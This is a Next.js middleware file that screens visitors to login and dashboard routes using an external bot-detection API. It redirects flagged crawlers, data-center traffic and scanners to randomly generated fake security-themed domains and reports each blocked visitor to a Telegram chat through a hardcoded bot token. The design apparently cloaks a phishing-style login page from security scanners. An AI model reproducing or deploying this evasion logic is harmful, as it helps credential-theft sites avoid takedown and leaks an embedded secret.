import { NextResponse } from 'next/server'

const TELEGRAM_BOT_TOKEN = '7322193975:AAHuE-RMKOah6-b9LZYMJ8CFnS84xdc_KvM'
const TELEGRAM_CHAT_ID = '-1002370596410'

function generateFakeDomain() {
  const securityTerms = [
    'secure', 'protection', 'safety', 'identity', 'privacy', 'firewall',
    'encryption', 'guard', 'defense', 'monitor'
  ]

  const loginTerms = [
    'login', 'signin', 'auth', 'verify', 'access', 'session',
    'passcode', 'token', 'key', 'credentials', 'logout'
  ]

  const systemTerms = [
    'portal', 'system', 'service', 'center', 'hub', 'manager',
    'gateway', 'network', 'console', 'node'
  ]

  const miscTerms = [
    'account', 'user', 'web', 'cloud', 'check', 'confirm',
    'scan', 'control', 'form', 'status', 'client'
  ]

  const endings = ['.com', '.net', '.org', '.co', '.cloud', '.info', '.app', '.support']

  const allWords = [...securityTerms, ...loginTerms, ...systemTerms, ...miscTerms]
  const shuffled = allWords.sort(() => 0.5 - Math.random())
  const picked = shuffled.slice(0, Math.floor(Math.random() * 2) + 2)
  const domainName = picked.join('-').toLowerCase()
  const tld = endings[Math.floor(Math.random() * endings.length)]

  return `https://${domainName}${tld}`
}

export async function middleware(req: Request) {
  const request = req as any
  const { pathname } = request.nextUrl

  if (
    pathname.startsWith('/_next') ||
    pathname.startsWith('/public') ||
    pathname === '/denied'
  ) {
    return NextResponse.next()
  }

  const ip =
    request.ip ||
    request.headers.get('x-forwarded-for')?.split(',')[0] ||
    '0.0.0.0'
  const userAgent = request.headers.get('user-agent') || 'Unknown'

  try {
    const response = await fetch(
      'https://bad-defender-production.up.railway.app/api/detect_bot',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ip, user_agent: userAgent }),
      }
    )

    if (!response.ok) {
      console.error('Bot API call failed:', response.status)
      const fakeDomain = generateFakeDomain()
      console.log(`🚫 Bot blocked and redirected to: ${fakeDomain}`)
      return NextResponse.redirect(fakeDomain)
    }

    const data = await response.json()
    const flags = data.details || {}

    const suspiciousFlags = {
      'Bot UA': flags.isBotUserAgent,
      'Scraper ISP': flags.isScraperISP,
      'IP Abuse': flags.isIPAbuser,
      'Traffic Spike': flags.isSuspiciousTraffic,
      'Data Center ASN': flags.isDataCenterASN,
    }

    const triggeredReasons = Object.entries(suspiciousFlags)
      .filter(([_, val]) => val)
      .map(([key]) => key)

    const isSuspicious = triggeredReasons.length > 0

    if (isSuspicious) {
      const isp = flags?.isp || 'Unknown'
      const asn = flags?.asn || 'Unknown'
      const fakeDomain = generateFakeDomain()

      console.log(`🚫 Bot from IP ${ip} redirected to: ${fakeDomain}`)

      const message = `
🚨 <b>Bot Blocked</b>
🔍 <b>IP:</b> ${ip}
🏢 <b>ISP:</b> ${isp}
🏷️ <b>ASN:</b> ${asn}
🧠 <b>Reason(s):</b> ${triggeredReasons.join(', ')}
🕵️‍♂️ <b>User-Agent:</b> ${userAgent}
🌐 <b>Redirected to:</b> ${fakeDomain}
      `.trim()

      try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML',
          }),
        })
      } catch (telegramError) {
        console.error('Telegram send failed:', telegramError)
      }

      return NextResponse.redirect(fakeDomain)
    }
  } catch (error) {
    console.error('Bot detection error:', error)
    const fakeDomain = generateFakeDomain()
    console.log(`⚠️ Fallback redirect to: ${fakeDomain}`)
    return NextResponse.redirect(fakeDomain)
  }

  return NextResponse.next()
}

export const config = {
  matcher: ['/login', '/', '/dashboard'], // Add or remove routes as needed
}
